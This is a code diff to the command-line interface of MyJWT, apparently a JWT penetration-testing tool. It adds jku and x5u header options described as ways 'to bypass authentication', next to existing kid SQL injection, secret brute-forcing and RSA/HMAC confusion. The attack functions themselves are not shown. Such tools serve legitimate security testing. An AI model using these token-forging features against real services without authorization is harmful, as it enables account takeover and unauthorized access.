@@ -9,7 +9,8 @@ from MyJWT.modifyJWT import changePayload, addheader, changeAlg, signature, addp
 from MyJWT.utils import jwtToJson, encodeJwt, HEADER, isValidJwt, SIGNATURE
 from MyJWT.variables import NOT_VALID_JWT, CHECK_DOCS, NOT_CRAKED, CRACKED, VALID_PAYLOAD, VALID_HEADER, \
     VALID_PAYLOAD_JSON, NEW_JWT, INVALID_SIGNATURE, VALID_SIGNATURE, VALID_DATA, VALID_COOKIES, VERSION
-from MyJWT.vulnerabilities import injectSqlKid, bruteforceDict, printDecoded, confusionRsaHmac, sendJwtToUrl
+from MyJWT.vulnerabilities import injectSqlKid, bruteforceDict, printDecoded, confusionRsaHmac, sendJwtToUrl, \
+    jkuVulnerability, x5uVulnerability
 
 
 @click.command()
@@ -32,6 +33,11 @@ from MyJWT.vulnerabilities import injectSqlKid, bruteforceDict, printDecoded, co
 @click.option("--bruteforce", type=click.Path(exists=True),
               help="Bruteforce to guess th secret used to sign the token.")
 @click.option("--kid", help="Kid Injection sql")
+@click.option("--jku", help="Jku Header to bypass authentication")
+@click.option("--x5u", help="X5u Header to bypass authentication")
+@click.option("--crt", help="For x5cHeader, force crt file")
+@click.option("--key", help="For jku or x5c Header, force private key to your key file")
+@click.option("--file", help="For jku Header, force file name")
 # print
 @click.option("--print", is_flag=True, help="Print Decoded JWT")
 # url
@@ -44,7 +50,7 @@ from MyJWT.vulnerabilities import injectSqlKid, bruteforceDict, printDecoded, co
               help="Cookies to send to your url.Format: key=value. if value = MY_JWT value will be replace by new jwt.",
               multiple=True)
 def myjwt_cli(jwt, full_payload, add_header, add_payload, sign, verify, none_vulnerability, hmac, bruteforce, kid,
-              print, url, method, data, cookies):
+              jku, x5u, crt, key, file, print, url, method, data, cookies):
     if not isValidJwt(jwt):
         sys.exit(NOT_VALID_JWT)
     if bruteforce:
@@ -86,7 +92,13 @@ def myjwt_cli(jwt, full_payload, add_header, add_payload, sign, verify, none_vul
             jwt = encodeJwt(jwtJson) + "." + jwtJson[SIGNATURE]
         except JSONDecodeError:
             sys.exit(VALID_PAYLOAD_JSON)
-
+    if x5u:
+        jwt = x5uVulnerability(jwt, url=x5u, pem=key, crt=crt)
+        click.echo(NEW_JWT + jwt)
+    if jku:
+        jwt = jkuVulnerability(jwt, jku, file, key)
+        click.echo(NEW_JWT + jwt)
+        click.echo(f"Please run python -m http.server --bind {jku} .Before send your jwt")
     if kid:
         jwt = injectSqlKid(jwt, kid)
         if not sign:
@@ -139,7 +151,7 @@ def myjwt_cli(jwt, full_payload, add_header, add_payload, sign, verify, none_vul
     if print:
         printDecoded(jwt)
 
-    if not none_vulnerability and not hmac and not bruteforce and not sign and not verify:
+    if not none_vulnerability and not hmac and not bruteforce and not sign and not verify and not jku and not x5u and not print:
         click.echo(NEW_JWT + jwt)
     sys.exit()
 
